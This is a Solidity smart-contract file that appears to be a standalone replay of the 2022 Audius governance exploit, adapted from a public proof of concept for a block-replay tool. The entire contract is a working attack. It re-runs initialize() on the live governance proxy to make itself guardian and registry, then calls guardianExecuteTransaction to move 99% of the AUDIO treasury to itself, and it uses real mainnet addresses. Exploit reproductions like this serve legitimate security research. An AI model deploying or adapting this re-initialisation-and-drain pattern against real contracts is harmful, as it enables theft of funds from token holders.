// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the Audius governance takeover (July 2022).
//
// The original DeFiHackLabs PoC (test/Audius_exp.sol) runs the attack INLINE in
// the Foundry `AttackContract` test harness and spans FOUR transactions with
// `vm.roll` between them (submit proposal -> vote -> wait votingPeriod +
// executionDelay -> evaluate). The EVM Playground recorder drives the whole
// replay against ONE fixed block, so a multi-block proposal lifecycle cannot be
// reproduced. This synthetic exploit reproduces the SAME root cause and the SAME
// treasury drain via the path the re-initialization directly unlocks in a single
// block: once `initialize()` re-runs and sets `guardianAddress = address(this)`,
// the attacker is the Guardian and `guardianExecuteTransaction(...)` performs the
// exact same `_executeTransaction` (raw `address.call`) that an approved proposal
// would — moving the AUDIO treasury to the attacker without any voting/waiting.
//
// This mirrors exactly what the real attacker obtained via the approved proposal
// (Governance.sol:5768 `_executeTransaction` inside `evaluateProposalOutcome` ==
// Governance.sol:5997 `_executeTransaction` inside `guardianExecuteTransaction`):
// a raw `AUDIO.transfer(attacker, 99% of treasury)` with Governance as msg.sender.
//
// The exploit contract also serves as the fake `_registryAddress` passed to
// `initialize()` (the registry is only ever called via `getContract(bytes32)`,
// which the attacker routes to AUDIO — same trick the Foundry test uses).

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IGovernance {
    function initialize(
        address _registryAddress,
        uint256 _votingPeriod,
        uint256 _executionDelay,
        uint256 _votingQuorumPercent,
        uint16 _maxInProgressProposals,
        address _guardianAddress
    ) external;
    function guardianExecuteTransaction(
        bytes32 _targetContractRegistryKey,
        uint256 _callValue,
        string calldata _functionSignature,
        bytes calldata _callData
    ) external;
}

contract AudiusDrain {
    // Fork-block-1 mainnet addresses (Ethereum).
    address constant GOVERNANCE = 0x4DEcA517D6817B6510798b7328F2314d3003AbAC; // Governance proxy
    IERC20 constant AUDIO = IERC20(0x18aAA7115705e8be94bfFEBDE57Af9BFc265B998);

    // Registry key the Foundry test used for the malicious transfer proposal.
    bytes32 constant KEY = bytes32(uint256(3078));

    function run() external {
        // --- 1. Re-initialize the already-live Governance proxy -----------------
        // The storage-layout collision between Initializable and the proxy means
        // the `initializer` guard no longer reflects the true initialized/admin
        // state, so `initialize()` is callable again by anyone. We rewrite every
        // safety knob: votingPeriod=3, executionDelay=0, quorum=1%, and crucially
        // guardianAddress = address(this).
        IGovernance(GOVERNANCE).initialize(
            address(this), // _registryAddress -> this contract (getContract -> AUDIO)
            3,             // _votingPeriod
            0,             // _executionDelay
            1,             // _votingQuorumPercent (1%)
            4,             // _maxInProgressProposals
            address(this)  // _guardianAddress -> the attacker
        );

        // --- 2. Drain 99% of the treasury as the Guardian -----------------------
        // guardianExecuteTransaction gates only on msg.sender == guardianAddress,
        // then runs the same arbitrary `_executeTransaction` a passed proposal
        // would. Governance (the treasury holder) is msg.sender for the inner
        // AUDIO.transfer, so this moves 99% of the treasury here in one call.
        uint256 stealAmount = (AUDIO.balanceOf(GOVERNANCE) * 99) / 100;
        IGovernance(GOVERNANCE).guardianExecuteTransaction(
            KEY,
            0,
            "transfer(address,uint256)",
            abi.encode(address(this), stealAmount)
        );
    }

    // --- registry callback (the attacker's fake registry returns AUDIO) ---------
    function getContract(bytes32) external view returns (address) {
        return address(AUDIO);
    }
}
